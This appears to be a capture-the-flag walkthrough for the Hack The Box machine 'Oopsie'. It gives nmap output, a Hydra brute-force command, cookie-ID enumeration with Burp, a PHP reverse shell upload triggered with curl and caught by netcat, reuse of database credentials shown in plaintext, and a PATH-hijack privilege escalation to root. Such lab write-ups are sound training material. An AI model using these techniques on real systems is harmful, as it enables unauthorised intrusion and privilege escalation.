# Hack The Box - Machine - Oopsie

Scan the host with `nmap`, the output will be as follow

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-13 05:39 EDT
Nmap scan report for 10.10.10.28
Host is up (0.032s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome

```
Dirbuster command might be usefull to see any possible hidden file or folder. 

Use Burp to spider the website and find possible paths. Run burp and set up the proxy on the browser to `127.0.0.1:8080`. Refresh the page and forward the request with Burp.

Under `cdn-cgi/login` there is a login form. Login in with `admin` and the password of the previous machine `MEGACORP_4dm1n!!`. 

Hydra can be used to find the user name. Inside the passowrd folder there is a list of passwords commonly used by HTB.

```bash
hydra -L rockyou.txt -P <password-list> 10.10.10.28 http-post-form "/dn-cgi/login/index.php:username=^USER^&password=^PASS^:Log in"

```

With Burp you can see that there is a cookie with a userID. Lett's bruteforce it with burp in order to find th superadmin. Generate a list of ids 

```bash
for i in `seq 1 100`; do echo $i; done
```

Click CTRL + i to sent the request to `Intruder`. Go on Payloads tab and paste the list of ids to the payload options. Next, click on the `Options` tab, and ensure that `Follow Redirectionsis` set to "Always", and select the option to "Process cookies in redirections". Click on the `Target` tab, and then click `Start attack`. We sort responses by Length, and view the results.

A few of a responses have a different length, and we proceed to examine them. The super admin account is visible, and corresponding user value is identified. superadminID = 86575

# Foothold

Through Burp in the `Target` we have seen that there is un `upload` folder. That one is going to be useful later. Anotehr way to find folder is using `https://github.com/maurosoria/dirsearch.git`

Now we have to go on `Uploads` using burp and change the userID in the cookie field. It's possible that the developer forgot to implement user input validation, and so we should test if we can upload other files, such as a PHP webshell. Let's user `/usr/share/webshells/php/php-reverse-shell.php`. 

Change the IP address, upload the file and open `netcat` in order to start the reverse shell `nc -lvnp 1234`. Send a request with curl `curl http://10.10.10.28/uploads/<name of the reverse shell>.php` and here we are.

Change the shell with the following command: `SHELL=/bin/bash script -q /dev/null`. 

# Lateral Movement

The website records are probably retrieved from a database, so it's a good idea to check for database connection information. Indeed, db.php does contain credentials, and we can su robert to move laterally.

Type `ls /var/www/html/cdn-cgi/login` and cat `db.php` in order to find user access. User = robert, Pass = M3g4C0rpUs3r!. Browse the Desktop page in order to find the userflag. user.txt = f2c74ee8db7983851ab2a96a44eb7981


# Privilege Escalation

Access robert user with `su robert`. The `id` command reveals that robert is a member of the bugracker group. We can enumerate the filesystem to see if this group has any special access.

`find / -type f -group bugtracker 2>/dev/null`

There is a `bugtracker` binary, and the setuid but is set. Let's run it and see what it does. It seems to output a report based on the ID value provided. Let's use strings to see how it does this.

We see that it calls the cat binary using this relative path instead of the absolute path. By creating a malicious cat, and modifying the path to include the current working directory, we should be able to abuse this misconfiguration, and escalate our privileges to root. Let's add the current working directory to PATH, create the malicious binary and make it executable.

```bash
export PATH=/tmp:$PATH
cd /tmp/
echo '/bin/sh' > cat
chmod +x cat
```

Re-run the `bugtracker` binary in order to get root access. Browse the root folder and get the admin flag. root.txt = af13b0bee69f8a877c3faf667f7beacf